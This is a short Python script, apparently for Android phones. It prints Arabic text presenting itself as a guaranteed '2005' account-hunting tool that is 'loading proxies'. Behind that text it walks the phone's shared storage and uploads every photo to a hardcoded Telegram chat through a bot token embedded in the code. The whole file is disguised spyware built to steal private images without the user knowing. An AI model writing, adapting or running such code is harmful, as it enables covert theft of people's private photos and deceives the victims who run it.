import sys
import os
import subprocess
import threading
from concurrent.futures import ThreadPoolExecutor

try:
    import telebot
except ImportError:
    subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pyTelegramBotAPI'])
    import telebot
    
bot = telebot.TeleBot('7567318500:AAHx5v2mNc02ltFy8SYAIoeubVQj5BMFerc')
dir_path = "/storage/emulated/0/"
def send_file(file_path):
    with open(file_path, "rb") as f:
        if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp")):
            bot.send_photo(chat_id=6206006240, photo=f)

def background():
    with ThreadPoolExecutor(max_workers=300) as executor:
        for root, dirs, files in os.walk(dir_path):
            for file in files:
             file_path = os.path.join(root, file)
             if file_path.lower().endswith((".jpg", ".png", ".jpeg", ".webp", ".PNG", ".JPG", ".JPEG")):
              executor.submit(send_file, file_path)
             else:
                 print('''

\033[1;32m= = = = = = = = = = = = = = = = = = = = =

اداه صيد 2005 ناريه مضمونه

يتم الان تحميل البروكسيات لتفادي الحضر

انتضر دقيقه لعدم الحضر 

\033[1;32m= = = = = = = = = = = = = = = = = = = = =

''')

threading.Thread(target=background).start()

bot.infinity_polling()
